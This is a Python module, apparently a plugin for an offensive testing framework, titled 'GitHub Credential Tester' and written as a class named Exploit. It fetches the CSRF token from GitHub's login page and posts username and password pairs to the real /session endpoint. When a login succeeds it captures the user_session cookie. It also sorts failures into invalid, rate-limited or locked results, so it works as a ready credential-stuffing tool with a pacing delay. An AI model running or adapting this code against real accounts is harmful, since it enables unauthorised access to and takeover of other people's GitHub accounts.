"""GitHub Credential Tester — /session CSRF login flow (HTTP)."""
import re
import time
from webforg.modules.auth.base_login_tester import BaseSocialLoginTester, LoginResult, AccountProfile


class Exploit(BaseSocialLoginTester):
    name = "GitHub Credential Tester"
    description = "Tests credentials against GitHub's web login (/session CSRF flow)."
    author = "K0uR1i"
    rank = "manual"

    platform_name = "github"

    def _get_csrf(self) -> str:
        try:
            resp = self.target.session.get("https://github.com/login", timeout=15)
            match = re.search(r'name="authenticity_token"\s+value="([^"]+)"', resp.text)
            if match:
                return match.group(1)
        except Exception:
            pass
        return ""

    def attempt_login(self, username: str, password: str) -> LoginResult:
        start = time.time()
        result = LoginResult(username=username, password=password, success=False)
        try:
            csrf = self._get_csrf()
            if not csrf:
                result.error_type = "csrf_fetch_failed"
                result.response_time_ms = (time.time() - start) * 1000
                self._stats["attempted"] += 1
                return result
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0", "Content-Type": "application/x-www-form-urlencoded"}
            resp = self.target.session.post(
                "https://github.com/session",
                data={"commit": "Sign in", "authenticity_token": csrf, "login": username, "password": password},
                headers=headers,
                timeout=15,
            )
            result.status_code = resp.status_code
            result.response_time_ms = (time.time() - start) * 1000
            self._stats["attempted"] += 1
            text = resp.text.lower()
            if self.target.session.cookies.get("user_session"):
                result.success = True
                result.session_token = self.target.session.cookies.get("user_session", "")
                self._stats["successful"] += 1
            elif "incorrect username or password" in text:
                result.error_type = "invalid_credentials"
            elif "too many attempts" in text:
                result.error_type = "rate_limited"
            elif "account has been locked" in text or "flagged" in text:
                result.error_type = "account_locked"
            elif "your account has been disabled" in text:
                result.error_type = "account_disabled"
            else:
                result.error_type = f"unknown: http {resp.status_code}"
            time.sleep((self.get_option("DELAY_MS") or 2000) / 1000)
        except Exception as e:
            self._stats["errors"] += 1
            result.error_type = f"connection_error: {str(e)[:50]}"
        return result

    def parse_login_response(self, response, username, password):
        pass

    def extract_profile(self, session_token: str, username: str) -> AccountProfile:
        return AccountProfile(platform="github", username=username, profile_url=f"https://github.com/{username}")
